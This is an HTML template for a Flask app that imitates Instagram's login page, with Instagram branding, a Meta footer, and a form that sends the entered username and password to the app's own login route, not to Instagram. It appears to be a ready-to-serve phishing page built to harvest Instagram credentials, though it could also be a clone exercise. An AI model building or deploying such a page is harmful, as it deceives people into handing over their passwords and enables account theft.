<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Instagram</title>

<!-- Favicon -->
<link rel="icon" type="png" href="{{ url_for('static', filename='images/logo.png') }}">

<style>
* { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
body { margin: 0; background: #fff; }
.container { display: flex; justify-content: center; align-items: center; min-height: 100vh; gap: 60px; padding: 20px; }

/* LEFT IMAGE */
.phone-preview { display: none; }
.phone-preview img { max-width: 380px; }

/* RIGHT LOGIN BOX */
.login-box { width: 350px; }
.box { border: 1px solid #dbdbdb; padding: 40px; text-align: center; }
.logo { font-family: cursive; font-size: 36px; margin-bottom: 30px; }
input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; }
button { width: 100%; padding: 10px; background: #4cb5f9; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; }
.or { margin: 20px 0; color: #8e8e8e; font-size: 13px; }
.fb-login { color: #385185; font-weight: bold; font-size: 14px; margin-bottom: 12px; }
.forgot { font-size: 12px; color: #00376b; }
.signup-box { border: 1px solid #dbdbdb; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; }
.signup-box span { color: #0095f6; font-weight: bold; }
/* FOOTER */
footer { text-align: center; font-size: 12px; color: #8e8e8e; margin: 40px 0 10px; }
@font-face { font-family: 'Billabong'; src: url('{{ url_for("static", filename="images/Billabong.ttf") }}') format('truetype'); }
.logo { font-family: 'Billabong', cursive; font-size: 42px; font-weight: normal; }

/* DESKTOP VIEW */
@media (min-width: 900px) { .phone-preview { display: block; } }
</style>
</head>

<body>
<div class="container">

  <!-- LEFT IMAGE -->
  <div class="phone-preview">
    <img src="{{ url_for('static', filename='images/landing-2x.png') }}" alt="Instagram preview">
  </div>

  <!-- LOGIN BOX -->
  <div class="login-box">
    <div class="box">
      <img src="{{ url_for('static', filename='images/Screenshot 2026-01-14 183535.png') }}" alt="Instagram">

      <form method="POST" action="{{ url_for('login') }}">
       <input type="text" name="name" placeholder="Phone number, username, or email" required>
       <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button>
      </form>

      <div class="or">OR</div>
      <div class="fb-login">Log in with Facebook</div>
      <div class="forgot">Forgot password?</div>
    </div>

    <div class="signup-box">
      Don't have an account? <span>Sign up</span>
    </div>
  </div>

</div>

<footer>
Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations  
<br>© 2026 Instagram from Meta
</footer>
</body>
</html>
